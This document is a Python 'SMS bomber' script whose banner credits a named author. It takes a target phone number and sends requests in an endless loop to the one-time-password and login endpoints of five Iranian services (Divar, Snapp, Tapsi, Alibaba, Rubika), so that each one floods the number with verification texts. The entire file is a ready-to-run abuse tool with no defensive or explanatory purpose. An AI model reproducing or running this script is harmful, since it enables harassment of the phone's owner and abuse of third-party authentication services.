import requests
import colorama
from colorama import Back , Fore
from requests import post , get

import time
colorama.init(autoreset=True)
#Logo

logo = """"

                           ____                  __                 ____  ____           _    _____
   _________ ___  _____   / __ )____  ____ ___  / /_  ___  _____   / __ \/ __ \____     | |  / <  /
  / ___/ __ `__ \/ ___/  / __  / __ \/ __ `__ \/ __ \/ _ \/ ___/  / /_/ / /_/ / __ \    | | / // / 
 (__  ) / / / / (__  )  / /_/ / /_/ / / / / / / /_/ /  __/ /     / ____/ _, _/ /_/ /    | |/ // /  
/____/_/ /_/ /_/____/  /_____/\____/_/ /_/ /_/_.___/\___/_/     /_/   /_/ |_|\____/     |___//_/   
\nCoded By MamadNabody6   TelegramID : @MamadNabody6   Created With Python\n\n"""
print(Fore.RED+logo)

#GetPhoneNum

PhoneNumber = input(Fore.BLUE+"Enter Your Number : ")

#GetJson

DivarJeson = {"phone":PhoneNumber}
SnapJeson = {"cellphone":PhoneNumber,"attestation":{"method":"skip","platform":"skip"},"extra_methods":[]}
TapsiJeson = {"credential":{"phoneNumber":PhoneNumber,"role":"PASSENGER"}}
AliBabaJeson = {"phoneNumber":PhoneNumber}
RubikaJeson = {"api_version":"3","method":"sendCode","data":{"phone_number":PhoneNumber,"send_type":"SMS"}}


#GetUrl

DivarURl = "https://api.divar.ir/v5/auth/authenticate"
TapsiUrl = "https://api.tapsi.cab/api/v2/user"
AliBabaUrl= "https://ws.alibaba.ir/api/v3/account/mobile/otp"
SnapUrl = "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp"
RubikaUrl = "https://messengerg2c149.iranlms.ir/"


#Start-For-Send-Message

print(Fore.MAGENTA+"For Stop Sms Bomber Press => Ctrl + C\n\n")
time.sleep(2)
while(True):
    DivarSendMessage = post(DivarURl,json=DivarJeson)
    if(DivarSendMessage.status_code == 200):
        print(Fore.YELLOW+"[+] DivarMessage Sended To "+str(PhoneNumber))
    else:
        print(Fore.LIGHTRED_EX+"[-] DivarMessage Not Sended")
    SnapSendMessage = post(SnapUrl,json=SnapJeson)
    if(SnapSendMessage.status_code == 200):
        print(Fore.YELLOW+"[+] SnapMessge Sended To "+str(PhoneNumber))
    else:
        
        print(Fore.LIGHTRED_EX+"[-] SnapMessage Not Sended")
    TpasiSendMessage = post(TapsiUrl,json=TapsiJeson)
    if(TpasiSendMessage.status_code==200):
        print(Fore.YELLOW+"[+] TapsiMessage Sended To "+str(PhoneNumber))
    else:
        print(Fore.LIGHTRED_EX+"[-] TapsiMessage Not Sended")
    AliBabaSendMessage = post(AliBabaUrl,json=AliBabaJeson)
    if(AliBabaSendMessage.status_code==200):
        print(Fore.YELLOW+"[+] AlibabaMessage Sended To "+str(PhoneNumber))
    else:
        print(Fore.LIGHTRED_EX+"[-] AlibabaMessage Not Sended")
    RubikaSendMessage = post(RubikaUrl,json=RubikaJeson)
    if(RubikaSendMessage.status_code==200):
        print(Fore.YELLOW+"[+] RubikaMessage Sended To "+str(PhoneNumber))
    else:
        print(Fore.LIGHTRED_EX+"[-] RubikaMessage Not Sended")
    

 
    
#coded By MamadNabody6 
#Telegram ID = > @MamadNabody6